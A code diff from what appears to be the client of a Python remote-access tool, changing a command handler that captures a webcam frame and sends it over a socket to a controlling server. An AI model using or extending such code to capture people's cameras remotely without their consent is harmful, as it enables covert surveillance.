@@ -424,20 +424,24 @@ class TCP:
             camara = int(params['-c'])
         except:
             camara = 0
-        captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
+
+        if self.__myOs.lower() == "windows":
+            captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
+        else:
+            captura = cv2.VideoCapture(camara)
 
         leido, frame = captura.read()
         captura.release()
 
         if leido:
-            self.__sock.send("ok".encode())
+            self.__sock.send("[+] info: ok".encode())
 
-            ok = self.__sock.recv(8)
+            self.__sock.recv(8)
             frame = cv2.imencode(".jpg", frame)[1]
             self.enviarDatos(frame)
         
         else:
-            self.__sock.send(f"error: Camara \"{camara}\" no encontrada".encode())
+            self.__sock.send(f"[!] warning: Camara \"{camara}\" no encontrada".encode())
 
     # Funcion para enviar video de la camara al servidor
     # cmd --> comando recibido
